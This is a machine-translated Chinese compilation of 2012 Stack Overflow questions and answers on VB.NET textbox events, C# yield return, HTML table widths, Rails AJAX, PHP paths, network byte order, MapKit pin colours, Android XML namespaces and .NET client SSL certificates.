> 时间：2012-11-22T14:17:40.563
> 
> 标签：vb.net, winforms, controls

我有一个自定义文本框控件来验证输入（去除不需要的字符）。除了我还想对控件的实现进行进一步处理之外，这很好用。

示例我在表单上有 3 个“specialTextbox”。sText1、sText2 和 sText3。sText1 & sText2 按预期工作。但是，当sText3的值发生变化时，我需要在论坛上进行更改，所以我在表单中有一个处理程序来处理ctext更改事件：

```
Private Sub sText3(sender As Object, e As EventArgs) Handles sText3.TextChanged
  'do some stuff here
End Sub 
```

但是，此例程似乎覆盖了自定义文本框的 OnTextChanged 方法。我已经尝试包含对 MyBase.OnTextChanged 的​​调用，但这仍然没有级联，无论我做什么，我似乎都无法让文本框完成其验证职责。

一定很简单，但我很难过！

这是一个覆盖文本框的类

```
Public Class restrictedTextBox
  Inherits Windows.Forms.TextBox

  Protected validChars As List(Of Char)

  Public Sub New(ByVal _validChars As List(Of Char))
    MyBase.New()

    validChars = _validChars
  End Sub

  Public Sub setValidChars(ByVal chrz As List(Of Char))
    validChars = chrz
  End Sub

  Protected Overrides Sub OnTextChanged(e As System.EventArgs)
    MyBase.OnTextChanged(e)

    Dim newValue As String = ""
    For Each c As Char In Me.Text.ToCharArray
      Dim valid As Boolean = False
      For Each c2 As Char In validChars
        If c = c2 Then valid = True
      Next

      If valid Then newValue &= c.ToString
    Next

    Me.Text = newValue
  End Sub
End Class 
```

这是一个具有自定义文本框的表单

```
Public Class frmNewForm
  Private Sub btnOK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnOK.Click
      MessageBox.Show("the text from the restricted text is: " & txtRestricted.Text)
  End Sub
End Class 
```

这是一个带有自定义文本框的表单，它实现了 TextChanged 事件

```
Public Class frmNewForm2
  Private Sub btnOK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnOK.Click
    MessageBox.Show("the text from the restricted text is: " & txtRestricted.Text)
  End If

 Private Sub txtRestricted_TextChanged(sender As Object, e As EventArgs) Handles txtRestricted.TextChanged
    'now that I have implemented this method, the restrictedTextBox.OnTextChanged() doesn't fire - even if I call MyBase.OnTextChanged(e)

    'just to be completely clear. the line of code below DOES get executed. But the code in restrictedTextBox.vb does NOT 
    lblAwesomeLabel.Text=txtRestricted.Text
  End Sub
End Class 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-09T15:14:24.553

它会触发，但可能不是您实现它的方式。

您的示例代码没有用于文本框的空构造函数，这意味着您在将文本框添加到表单时很可能没有使用设计器。

但是您的表单显示它是由设计师创建的：

```
Private Sub txtRestricted_TextChanged(sender As Object, e As EventArgs) _
  Handles txtRestricted.TextChanged
End Sub 
```

您发布的代码无法做到这一点。如果您正在以编程方式创建“新”控件，那么您也需要以编程方式连接事件。

删除处理程序并留下存根：

```
Private Sub txtRestricted_TextChanged(sender As Object, e As EventArgs)
  'yada-yada-yada
End Sub 
```

然后当您创建一个新文本框时，将其连接起来：

```
txtRestricted = new restrictedTextBox(myCharsList)
AddHandler txtRestricted.TextChanged, AddressOf txtRestricted_TextChanged
Me.Controls.Add(txtRestricted) 
```

# c# - 收益回报使用

> ID：13514607
> 
> 赞同：1
> 
> 时间：2012-11-22T14:17:42.000
> 
> 标签：c#, yield-return

方法一：

```
class myClass
{
   List<SomeType> _list;

   IENumerator<SomeType> GetEnumerator()
   {
      foreach(SomeType t in _list)
        yield return t;
   }
}

myClass m = new myClass();
List<SomeType> list;
...
foreach(SomeType t in m)
  list.Add(t); 
```

方法二：

```
class myClass
{
    public List<SomeType> _list {get; private set;}
}

myClass m = new myClass();
...
List<SomeType> list = m.list; 
```

哪种方法更好？如果是第二个，那么你能告诉我收益回报的真实使用吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:25:42.580

两者都不。

如果你想要一个枚举器，并且已经有一个底层`IEnumerable`类型（`List`implements `IList`which extends `IEnumerable`），那么就这样返回它：

```
public IEnumerator<SomeType> GetEnumerator ()
{
    return _list.GetEnumerator();
} 
```

否则，如果您确实需要一个列表，即使用索引进行随机访问，则返回一个`IList`; 如果你真的想返回它的内部实现类型， ie `List`，那么你可以让它成为一个可访问的属性。但请注意，私有设置器不会阻止修改列表（添加或删除项目等）。如果需要，请改为返回只读列表：

```
public IList<SomeType> List
{
    get { return _list.AsReadOnly(); }
} 
```

### 关于产量

> 你能告诉我收益回报的真实使用吗？

`yield return`很有用，当您实际上有一个生成器时，当您实际需要生成下一个项目时。一个简单的例子是一个随机数生成器，只要你不断询问它，它就会为你提供另一个随机数。它不一定有结束，但在开始之前你可能不知道数字的数量。

另一个常见的用法是从某个外部源检索数据的任何东西。例如来自网络服务的项目列表。在您不知道有多少项目之前，您不一定知道您实际需要多少项目（因为您可能希望以无休止的方式显示它，一次显示一个）。在这种情况下，您可以这样做：

```
IEnumerable<Item> GetItems()
{
    while (Service.HasMorePages())
    {
        foreach (Item item in Service.GetNextPage())
        {
            yield return item;
        }
    }
    yield break;
} 
```

`GetNextPage`将始终一次返回一个`N`项目列表，并且只要您想要的项目多于您已经收到的项目，您就会得到下一个。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T14:26:03.337

具有集合属性的类通常最好以列表的形式完成，这样它就可以多次迭代和变异。这对于仅代表一个序列的枚举器是不可能的。枚举器的典型用途可能是：

*   动态过滤数据（例如`Enumerable.Where`）
*   从包含多条记录的文件中顺序读取单个项目，而不是一次全部加载
    *   或网络套接字
    *   或数据库服务器
*   在数据序列上提供一个只转发、只读的包装器
*   ETC

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T14:35:24.543

选项没有限制，

```
public IEnumerator<int> FibonnaciSeries()
{
    int a = 1;
    int b = 1;

    yield return 1;
    yield return 1;

    while (true)
    {
        var c = a + b;
        a = b;
        b = c;
        yield return c;
    }
} 
```

想到一个简单的例子，斐波那契数列是真实世界吗？

* * *

这不是最有效的实现方式。

# html - 如何根据最宽列保持 HTML 表格中所有列的列宽相等

> ID：13514608
> 
> 赞同：2
> 
> 时间：2012-11-22T14:17:48.537
> 
> 标签：html, html-table, column-width

我看到很多关于列宽的问题，但我无法找到与我完全一样的场景的答案。

这是我的桌子：

```
<table>
    <tr>
        <td colspan="3">Title goes here</td>
        <td>A</td>
        <td class="right">B</td>
    </tr>

    <tr>
        <td rowspan="3">C</td>
        <td>D</td>
        <td>E</td>
        <td>F</td>
        <td class="right">G</td>
    </tr>

    <tr>
        <td>H</td>
        <td colspan="2" class="center">I</td>
        <td rowspan="2" class="right">J</td>
    </tr>

    <tr>
        <td>K</td>
        <td>L</td>
        <td>M</td>
    </tr>

    <tr>
        <td class="right">N</td>
        <td colspan="4" class="center">O</td>
    </tr>
</table> 
```

这是我的CSS：

```
<style>
    table 
    {
        table-layout: fixed;

    }

    table, td 
    {
        border: 1px solid;
    }

    .right 
    {
        text-align:right;
        vertical-align:bottom;
    }
    .center 
    {
        text-align: center;
    }
</style> 
```

我想要实现的是所有五列在最宽的基础上具有相同的宽度。我的想法是我不知道标题会有多大。我知道我可以为表格设置一个固定宽度（例如 200 像素或 100%），但我不想这样做。我希望列的宽度和表格的宽度随着标题的扩展而扩展。如您所见，标题跨越三列。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:34:20.010

恐怕这不能在 HTML 中完成，即使在 CSS 的帮助下。您还需要一些脚本：在浏览器格式化表格后处理表格的脚本，找出最宽的列，并将所有列设置为该宽度。假设你的`table`元素有`id=t`，下面的纯 JavaScript 代码可以完成这项工作：

```
<script>
window.onload = function () {
var tbl = document.getElementById("t");
var row = tbl.rows[0];
var maxWidth = 1;
for ( var i = 0; i < row.childNodes.length; i++ ) {
  var width = row.childNodes[i].offsetWidth;
  if(width > maxWidth) { maxWidth = width; } 
  }
for ( var i = 0; i < row.childNodes.length; i++ ) {
  row.childNodes[i].style.width = maxWidth + "px"; 
  }
}
</script> 
```

# jquery - AJAX 调用未在 Rails 3 上触发

> ID：13514609
> 
> 赞同：0
> 
> 时间：2012-11-22T14:17:54.933
> 
> 标签：jquery, ajax, ruby-on-rails-3

我有一个看起来像这样的表格

```
<%= form_tag(suggestions_path, :remote => true, :id=>"suggestpopform") do %>
 <p>
   Subject:<br />
   <%= text_field_tag "subject" %>
 </p>

 <p>
   Feedback or suggestion on anything:<br />
   <%= text_area_tag "description", "", :size=>"50x20" %>
 </p>

 <p>
   <%= submit_tag 'Submit' %>
 </p>
<% end %> 
```

这导致调用 create.js.erb

但是，由于创建操作发送电子邮件，因此存在延迟。所以我想让表单在 ajax 开始使用 ajax:before （或加载）和 create.js.erb 时立即消失

```
$("#suggestpopform").bind("ajax:before",function() {
    $("#suggestpop").html("Thanks a lot!");
}); 
```

但无论我尝试什么，都没有任何反应。

但是，如果我在 create.js.erb 中只有`$("#suggestpop").html("Thanks a lot!");`它可以正常工作。

如何使用 ajax:before 或 ajax:loading？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-24T15:10:35.743

事件在文档上触发，而不是在“#suggestpopform”中触发，因此您需要将句柄连接到文档，而不是特定表单。

放置此代码的正确位置将在

> 应用程序/资产/javascripts/.js.coffee

此外，在发送请求之前触发的事件名称是：

> ajax：发送前

这与大多数教程和文档中的内容不同，因为它最近发生了变化。

您的代码在该文件中应类似于：

```
$(document).ready(
            -> 
                $(document).on("ajax:beforeSend", (event)->
                    $(event.target).html("Thanks a lot!");
                );
) 
```

希望这可以帮助，

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T17:05:53.637

由于表单是部分的，您应该在呈现部分的*主html.erb 文件中包含以下 javascript：*

```
$(document).on("ajax:beforeSend", "#suggestpopform", function() {
      $("#suggestpop").html("Thanks a lot!");
}); 
```

# javascript - Node.js子进程，在事件句柄中访问进程对象？

> ID：13514610
> 
> 赞同：0
> 
> 时间：2012-11-22T14:17:57.353
> 
> 标签：javascript, node.js, child-process

所以我的 NodeJs 应用程序中有一组子进程。我现在有

```
cp_array[i].process.on("exit",exithandle(code,signal)); 
```

在他们每个人身上。问题是我希望能够访问在退出句柄中退出的进程的进程对象。因此，如果我输入 cp_array[i].process.name="example" 之类的内容，我就可以在 exithandle 函数中使用 process.name 访问我的“example”字符串。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:21:56.983

您可以`cp_array[i].process`通过`this`关键字访问：

```
function exithandle(code, signal) {
    var process = this;
    return function() {
        // Whatever
    };
} 
```

# javascript - 嵌入和滚动子元素的容器

> ID：13514611
> 
> 赞同：0
> 
> 时间：2012-11-22T14:18:01.673
> 
> 标签：javascript, html, css

我有许多水平`HTMLElement`的总和比视口宽。

现在我想要一个容器，其中包含所有这些，我可以告诉它将其中一个`HTMLElement`s 移动到视图中（通过*Javascript*）。默认行为应该是`overflow: hidden`.

是否已经有某种小部件可以处理这个问题？它可以很好地利用*JQuery*，因为我已经使用它了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:25:44.407

您可以尝试插件[jQuery.scrollTo](http://demos.flesler.com/jquery/scrollTo/)。

# php - PHP 性能：在会话中存储类对象 vs 静态 vs 全局

> ID：13514613
> 
> 赞同：0
> 
> 时间：2012-11-22T14:18:16.353
> 
> 标签：php, performance, session, web

我一直在寻找这个问题的答案，到目前为止我一直无法找到答案。我的问题是；存储不需要任何动态输入的巨大全局类的最佳方法是什么，它只需要使用一次。

让我们以一个模板类为例：

```
<?php
class Design_API{
   function loadfile($file){
     //load file here
   }

   // do file manipulation here

   function presentfile(){
      echo($this->file);
   }

}
?> 
```

使用此类作为布局的基本示例。使用它的最佳方式是性能和安全性。是否将其创建为全局实例？将实例存储在会话中；或者干脆把它变成一个静态类。

另外，假设我们使用了一个会话，如果 2 个客户端在同一毫秒访问该站点，php 是否会锁定会话文件，从而强制客户端 2 的 Web 加载需要更长的时间？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:29:32.543

这个问题有点混乱，无法以一致的方式回答，所以这里有几点：

*   一个客户端不会阻止另一个客户端，除非他们正在访问共享资源
*   会话不是不同用户之间共享的资源，忘记这个误解
*   无论您在哪里存储对象，性能几乎都不会改变
*   它使不同请求和用户之间的差异更小，因为请求之间没有共享资源
*   首先编写你的意思和最可维护的代码，稍后在证明它很慢时优化它以提高性能（它可能不会）
*   尽可能避免全局变量
*   不要在会话中存储不属于那里的东西，比如代码
*   尽量避免`static`类，它们会导致代码耦合，应该减少
*   `static`类不一定更快

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:27:38.543

处理这个问题的最好方法是使这个类成为一个 Singleton 类并使用静态方法来实例化它。

在会话中存储对象将涉及序列化和反序列化，这对性能非常不利。此外，如果您在类中存储任何资源，则它们无法被序列化。

# networking - 为什么网络字节顺序定义为大端？

> ID：13514614
> 
> 赞同：94
> 
> 时间：2012-11-22T14:18:17.650
> 
> 标签：networking, network-protocols, endianness, tcp-ip

正如标题中所写，我的问题是，为什么**TCP/IP**在传输数据时使用大端编码而不是替代的小端方案？

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2012-11-22T14:36:47.297

**[RFC1700](https://www.rfc-editor.org/rfc/rfc1700)**声明**它必须如此**。（并将网络字节顺序定义为大端）。

> Internet 协议文档中的约定是以十进制表示数字并以“大端”顺序 [COHEN] 来描绘数据。也就是说，字段是从左到右描述的，左边是最重要的八位字节，右边是最不重要的八位字节。

他们的参考是

```
On Holy Wars and a Plea for Peace 
Cohen, D. 
Computer 
```

可在[**IEN-137**](http://www.ietf.org/rfc/ien/ien137.txt)或[此 IEEE 页面](http://ieeexplore.ieee.org/xpl/articleDetails.jsp?arnumber=1667115)上找到摘要。

* * *

**概括：**

> 选择哪种方式并没有太大的区别。就订单达成一致比商定哪种订单更重要。

它得出的结论是，大端和小端方案都是可能的。没有**更好/更差**的方案，只要在整个系统/协议中保持一致，就可以使用其中任何一个来代替另一个。

# parallel-processing - Mathematica 上的平行拟合

> ID：13514617
> 
> 赞同：1
> 
> 时间：2012-11-22T14:18:21.953
> 
> 标签：parallel-processing, wolfram-mathematica, curve-fitting, data-analysis, least-squares

我有一个如下所示的数据

```
data=
Table[
    Table[
            a[[i]]*j+1,
        ,{j,dataLength}]
    ,{i,numOfDatasets}] 
```

我想用 NonlinearModelFit[] 拟合这些数据集

```
Table[
    NonlinearModelFit[data[[i]], a x + b, {a,b},x]
,{i,NumberOfDatasets}] 
```

我想拟合的函数不是线性的，但这只是一个例子。

我的问题是我需要并行化这样的操作。我试过用 ParallelTable 来做，但我得到了几十个错误。小伙伴们知道这是怎么做到的吗？

感谢您的任何努力。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-24T14:00:20.400

将您的初始数组重命名`a`为并为我`arr`编写工作后：`ParallelTable`

```
dataLength = 10
numOfDatasets = 5
arr = Table[RandomInteger[i], {i, 1, numOfDatasets}]
data = Table[Table[arr[[i]], {j, dataLength}], {i, numOfDatasets}]
ParallelTable[NonlinearModelFit[data[[i]], a x + b, {a, b}, x], {i, numOfDatasets}] 
```

输出：

> {拟合模型[1。-1.13164*10^-17 x],FittedModel[2\. -2.26329*10^-17 x],FittedModel[1\. -1.13164*10^-17 x],FittedModel[3.],FittedModel[1\. -1.13164*10^-17 x]}

Mathematica 很可能被您的数据数组和Table 语句中`a`的 fit 参数弄糊涂了。`a`

# javascript - RequireJS 是否应该处理我的应用程序中的所有外部 JavaScript 库？

> ID：13514620
> 
> 赞同：1
> 
> 时间：2012-11-22T14:18:29.520
> 
> 标签：javascript, jquery, requirejs

我正在使用 RequireJS（并正在学习它），但我不明白 RequireJS 是否应该管理我的应用程序中的外部库。目前我有一个用于 jQuery 的脚本标签，另一个用于 jQuery 工具等等。我还成功地将 RequireJS 添加到我的应用程序中，我想知道 HTML 中唯一的脚本标记是否来自 RequireJS？

如果是这样，即使我不将 jQuery 等用作模块中的依赖项，是否也会在页面上正确添加它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T20:43:13.627

您始终可以将 jquery 作为依赖项添加到您的主文件中，该文件通过 requirejs 脚本标签的 data-main 链接到该文件。这解决了我相信的一切。

[这篇文章的答案](https://stackoverflow.com/questions/9330903/bootstrapping-requirejs-app-with-jquery-as-a-module-without-data-main-attribute?rq=1)很好地详细说明了您想要做什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:22:30.597

> 我想知道 HTML 中唯一的脚本标签是否来自 RequireJS？

对此没有“正确”的答案。两种方法都有其优点。

> 如果是这样，即使我不将 jQuery 等用作模块中的依赖项，是否也会在页面上正确添加它？

不。除非你告诉它，否则 Require 无法知道它必须加载 jQuery。该文档[有一整页](http://requirejs.org/docs/jquery.html)关于该主题。

# objective-c - 从 MKAnnotation 对象更改图钉颜色

> ID：13514624
> 
> 赞同：1
> 
> 时间：2012-11-22T14:18:41.033
> 
> 标签：objective-c, ios

我努力实现这一点。我有一个类，它是 NSObject 的子类，表示地图上的注释。在该类中，当用户按下注释时，我有一个警报视图。我想做的是，在用户从警报中按下确定后，我想将图钉的颜色从红色更改为绿色。

下面是我的 MKAnnotation 类...

。H

```
#import <Foundation/Foundation.h>
#import <MapKit/MapKit.h>
#import "MapMenu.h"

@interface BuildingViewController : NSObject <MKAnnotation, MapMenuDelegate>{

    NSString *name;
    NSString *description;
    CLLocationCoordinate2D location;
    NSString *owner; /*user object*/

}

@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, readonly) CLLocationCoordinate2D coordinate;
@property (nonatomic, copy) NSString *owner;
@property (nonatomic, retain) IBOutlet MapMenu *menu;

- (id) initBuildingWithName: (NSString *) _name andCoordinates: (CLLocationCoordinate2D) _location
shortDescription:(NSString *)_description andOwner:(NSString *)_owner inDistance: (NSInteger) _distance;

- (void) addMenuOnView: (MKMapView*) mapView;
- (void) hideMenuFromView;
- (void) setAttackEnable: (BOOL) attack;
- (void) attackTo: (BuildingViewController*) selectedBuilding;

@end 
```

.m

```
#import "BuildingViewController.h"
#import "CountDownTimer.h"

@implementation BuildingViewController{

    MapMenuItem* starMenuItem1, *starMenuItem2,
        *starMenuItem3, *starMenuItem4;
    NSInteger distance;
    MKMapView* parentView;
}

@synthesize title, subtitle, coordinate, owner, menu = _menu;

- (id) initBuildingWithName:(NSString *)_name andCoordinates:(CLLocationCoordinate2D)_location
 shortDescription:(NSString *)_description andOwner:(NSString *)_owner inDistance:(NSInteger)_distance{

    self = [super init];
    title = _name;
    coordinate = _location;
    subtitle = _description;
    owner = _owner;
    distance = (int)round(_distance);

    UIImage *storyMenuItemImage = [UIImage imageNamed:@"bg-menuitem.png"];
    UIImage *storyMenuItemImagePressed = [UIImage imageNamed:@"bg-menuitem-highlighted.png"];

    UIImage *starImage = [UIImage imageNamed:@"icon-star.png"];

    starMenuItem1 = [[MapMenuItem alloc] initWithImage:storyMenuItemImage highlightedImage:storyMenuItemImagePressed
                                          contentImage:starImage highContentImage:nil isDisable:NO];

    starMenuItem2 = [[MapMenuItem alloc] initWithImage:storyMenuItemImage highlightedImage:storyMenuItemImagePressed
                                          contentImage:starImage highContentImage:nil isDisable:NO];

    starMenuItem3 = [[MapMenuItem alloc] initWithImage:storyMenuItemImage highlightedImage:storyMenuItemImagePressed
                                          contentImage:starImage highContentImage:nil isDisable:NO];

    starMenuItem4 = [[MapMenuItem alloc] initWithImage:storyMenuItemImage highlightedImage:storyMenuItemImagePressed
                                          contentImage:starImage highContentImage:nil isDisable:NO];

    if (distance > 10){
        [self setAttackEnable:NO];
        starMenuItem1.disable = YES;
    }

    NSArray *menus = [NSArray arrayWithObjects:starMenuItem1, starMenuItem2, starMenuItem3, starMenuItem4, nil];

    _menu = [[MapMenu alloc] initWithFrame:self.menu.bounds menus:menus];
    _menu.delegate = self;

    return self;
}

- (void) addMenuOnView:(MKMapView *)mapView{

    parentView = mapView;
    [parentView addSubview: _menu];
}

- (void) hideMenuFromView{

    [_menu removeFromSuperview];
}

- (void) setAttackEnable:(BOOL)attack{

    if (attack) {
        [starMenuItem1 setHighlighted:NO];
    }else{
        [starMenuItem1 setHighlighted:YES];
        [starMenuItem1 setImage:[UIImage imageNamed:@"bg-menuitem-highlighted.png"]];
    }
}

- (void)MapMenu:(MapMenu *)menu didSelectButton:(NSInteger)index{

    NSLog(@"Select the index : %d\n",index);
    NSLog(@"%@", self.owner);

    if (index == 0) {
        if (self.owner == nil && distance < 10) {
            CountDownTimer* countDown = [[CountDownTimer alloc]init];
            [countDown startTimerOn:parentView];
            [self performSelector:@selector(attackTo:) withObject:nil afterDelay:20.0];

        }
        else if (self.owner == @"Player_1")
            NSLog(@"You have already occupy this building with name, %@", self.title);
    }
}

- (void) attackTo: (BuildingViewController*) selectedBuilding{

    self.owner = @"Player_1";
    [self showMessage:@"Success" withContent:@"You are the new owner of the building."];
    //NSLog(@"Building has a new owner with name, %@", self.owner);
}

- (void) showMessage: (NSString*) msgTitle withContent: (NSString*) content{

    UIAlertView *message = [[UIAlertView alloc] initWithTitle:msgTitle
        message:content
        delegate:self
        cancelButtonTitle:@"OK"
        otherButtonTitles:nil];
    [message show];

}

- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{

    if (buttonIndex == 0) {

        //I want to change the pin colour here.
    }
}

@end 
```

我在父视图（mapView）上添加引脚的行上收到警告： `Sending 'MKPinAnnotationView *__strong' to parameter of incompatible type 'id<MKAnnotation>'` 当我运行应用程序时，按确定时崩溃。我不知道我做错了什么。

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-22T15:05:02.677

我正在试一试，不确定它是否会起作用。

在注释中添加一个属性：

```
@property (nonatomic) BOOL annotationWasSelected; 
```

这将设置为`TRUE`当用户关闭 UIAlertView 时（将其初始化为`FALSE`）。

所以用那个替换你的代码：

```
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{

    if (buttonIndex == 0) {

        _annotationWasSelected = TRUE;

        // Remove and add the annotation so it's re-drawn
        [parentView removeAnnotation:self];
        [parentView addAnnotation:self];
    }
} 
```

在你的 mapView 的委托中，你应该做这样的事情：

```
- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id <MKAnnotation>)annotation {

    static NSString *identifier = @"MyAnnotation";
    MKPinAnnotationView *annotationView = (MKPinAnnotationView *) [_mapView dequeueReusableAnnotationViewWithIdentifier:identifier];

    YourAnnotationClass *myAnnotation = (YourAnnotationClass*) annotation;

    // If a new annotation is created
    if (annotationView == nil) {

        annotationView = [[MKPinAnnotationView alloc] initWithAnnotation:myAnnotation reuseIdentifier:identifier];

        // Annotation's color
        if (myAnnotation.annotationWasSelected) {
            annotationView.pinColor = MKPinAnnotationColorGreen;
        }
        else {
            annotationView.pinColor = MKPinAnnotationColorRed;
        }

    } else {

        annotationView.annotation = annotation;

        // Annotation's color
        if (myAnnotation.annotationWasSelected) {
            annotationView.pinColor = MKPinAnnotationColorGreen;
        }
        else {
            annotationView.pinColor = MKPinAnnotationColorRed;
        }
    }

    return annotationView;
} 
```

您必须将此代码与现有代码合并。

同样，我不完全确定此代码，现在无法对其进行测试。让我知道它是否有帮助。

# android - 使用 xmlns:sliding 解析 XML 未绑定前缀时出错

> ID：13514626
> 
> 赞同：0
> 
> 时间：2012-11-22T14:18:44.480
> 
> 标签：android, xml, layout, xml-namespaces, sliding

我正在尝试使用[jfeinstein 滑动菜单](https://github.com/jfeinstein10/SlidingMenu)，恕我直言，看起来很有希望。我喜欢[使用布局配置](https://github.com/jfeinstein10/SlidingMenu#usage)而不是代码来使用它的想法。我有以下非常简单的布局配置。

```
<com.slidingmenu.lib.SlidingMenu
xmlns:sliding="http://schemas.android.com/apk/res-auto"
android:id="@+id/slidingmenulayout"
android:layout_width="match_parent"
android:layout_height="match_parent"
sliding:viewAbove="@layout/customforabove"
sliding:viewBehind="@layout/customforbehind"
sliding:behindOffset="120dip"
sliding:behindScrollScale="0.25" 
```

/>

但是我收到一个关于未绑定前缀的错误。我不知道是因为 xmlns 之后的滑动，还是其他原因。

提前谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:23:04.330

我认为应该是

```
xmlns:sliding="http://schemas.android.com/apk/res/auto" 
```

（没有破折号）

并将“auto”替换为在哪里可以找到该滑动菜单库的包名

尝试：

```
xmlns:sliding="http://schemas.android.com/apk/res/com.slidingmenu.lib" 
```

这应该在您使用它的任何资源文件的顶部元素中（在 xmlns:android 旁边是正确的位置）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T22:51:17.600

属性 'android:id'、'android:layout_width' 和 'android:layout_height' 的名称中的“android”也是命名空间前缀，因此通常需要在某处适当填写名为 'xmlns:android' 的属性在标记中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-25T21:42:53.240

我在一分钟前得到了这个答案。通过执行以下操作修复它：

```
xmlns:android="http://schemas.android.com/apk/res/android" 
```

# php - 在 PHP 和 HTML 中包含路径

> ID：13514627
> 
> 赞同：1
> 
> 时间：2012-11-22T14:18:48.210
> 
> 标签：php, html, path

我在构建小型网站时遇到了 PATH 问题。该站点由不同文件夹中的一些标准页面和名为 _include 的文件夹中的其他一些页面组成。我现在在每个页面上都包含三个文件 - menu.php、header.php 和 footer.php - 所有三个文件都包含在文件夹 _include 中。我已经使用了 set_include_path 并且就 PHP 而言它工作得很好。但是，在涉及 HTML 时存在问题。在 header.php 文件中我有这个语法`<img src="_pics/header.png" width="XXX" height="YYY" />`

只要包含 header.php 的所有文件都在同一目录中，代码就可以正常工作并且图片会加载。但是如果我尝试将它包含在子目录的页面中，那么图片不会加载，这很明显，因为目录级别现在已经改变。

所以我的问题是如何解决这个问题，以便 HTML 路径在包含的 PHP 文件中工作，无论它们放在网站上的什么位置？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:23:33.430

最简单的解决方案是始终使用相对于 web-root 的资产的绝对路径：

```
<img src="/_pics/header.png" width="XXX" height="YYY" />
          ^ absolute path 
```

这适用于图像、javascript 文件、css 文件等所有内容。

现在，您的包含文件的位置无关紧要，甚至可以在 web-root 之外。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:28:47.117

如果您的路径是静态的，您可以使用 php document_root 或 server_name 变量。

```
<?php echo "<img src=\"http://".$_SERVER['SERVER_NAME']."/_pics/header.png\" width="XXX" height="YYY" />"; ?>
<?php echo "<img src=\"".$_SERVER['DOCUMENT_ROOT']."/_pics/header.png\" width="XXX" height="YYY" />"; ?> 
```

如果您的页面被移动，但您需要在此代码中更改它以反映新位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:36:08.653

[您必须了解绝对 URL 和相对 URL](http://www.webdevelopersnotes.com/design/relative_and_absolute_urls.php3)之间的区别。

> 只要包含 header.php 的所有文件都在同一目录中，代码就可以正常工作并且图片会加载。但是如果我尝试将它包含在子目录的页面中，那么图片不会加载，这很明显，因为目录级别现在已经改变。

```
<img src="_pics/header.png" width="XXX" height="YYY" /> 
```

当您尝试包含在子目录中时它如何映射 -

`<img src="subdir/_pics/header.png" width="XXX" height="YYY" />`

如您所知，图片未放置在下方，`subdir`因此未加载图片。

在这种情况下，您必须使用以 wtih 开头`http://`和结尾的绝对 URL`picname.png`作为示例。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-22T14:29:42.083

使用完整路径，例如：http:// domain_name/path 。这可能就是您要查找的内容。

# .net - HttpWebRequest 似乎没有发送客户端 SSL 证书

> ID：13514628
> 
> 赞同：7
> 
> 时间：2012-11-22T14:18:58.157
> 
> 标签：.net, security, ssl, nginx, httpwebrequest

我正在尝试使用 an`HttpWebRequest`来查询运行 nginx 的远程服务器。我需要提供客户端证书才能完成连接。

我正在执行以下操作：

```
Dim Request As HttpWebRequest = DirectCast(WebRequest.Create(Url), HttpWebRequest)
Dim Cert = SSL.GetClientCertificate()
Request.ClientCertificates.Clear()
Request.ClientCertificates.Add(Cert)
Dim Response As WebResponse = Request.GetResponse() 
```

（`SSL.GetClientCertificate`只是一个辅助方法，它`My`在本地计算机上打开存储并检索适当的证书（作为`X509Certificate2`）。正在返回正确的证书。我也尝试从具有相同结果的文件中加载证书。）

就目前情况而言，当我到达`Dim Response As...`并且它实际上试图打开连接时，我收到一个 400 Bad Request 返回，并带有以下正文：

```
400 Bad Request
No required SSL certificate was sent
-----------------------------------
nginx/1.0.10 
```

我们正在使用我们自己的 CA，它`LocalMachine\TrustedRootCertificationAuthorities`在我的机器上有一个证书。客户端证书有效但验证失败，因为我们的 CA 没有公开[OCSP](http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol)端点。如果我创建一个 X509Chain 并要求它验证链而不检查撤销，一切都会通过。

所以我的问题是......为什么证书没有随请求一起发送？我不认为它应该在发送之前尝试验证客户端证书（这是服务器的工作）。

我不会在 Wireshark 日志中淹没你，但客户端没有发送证书。简而言之，我得到...

*   [Out] 客户你好
*   [在] 服务器你好
*   [在] 证书
*   [在]服务器你好完成
*   [出] 证书、客户端密钥交换、更改密码规范、加密握手消息
*   [在]更改密码规范，加密握手消息
*   [Out] 应用程序数据（大概是 GET 请求）
*   [在] 应用程序数据（大概是 400）
*   [In] 加密警报（终止频道）

我*认为*nginx 正在做一些聪明的事情，而不是在我无法发送证书时死亡，而是重新协商以允许它发送 400 响应正文（而不是一开始就无法创建通道）

无论如何，我不会发送真正问题的证书。有谁知道为什么？

如果有帮助，nginx 的日志坚持没有发送证书（而不是证书无效）：

> 2012/11/22 14:16:26 [info] 27755#0: *799 客户端在读取客户端请求标头时未发送所需的 SSL 证书，客户端：10.0.0.200，服务器：10.0.0.100，请求：“GET /state HTTP /1.1”，主机：“10.0.0.100”

